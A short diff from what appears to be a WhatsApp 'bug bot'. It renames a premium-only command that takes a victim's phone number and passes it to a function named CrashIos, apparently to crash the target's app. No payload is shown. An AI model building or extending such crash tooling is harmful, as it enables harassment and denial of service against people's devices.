@@ -563,7 +563,7 @@ async function CrashIos(rikz, target) {  // ← ADD rikz parameter
 //======================
 switch (command) {
 //case bug
-case "Trinity-fc": {
+case "alastor": {
     if (!isPremium) return m.reply('Premium Only');
     if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
     target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
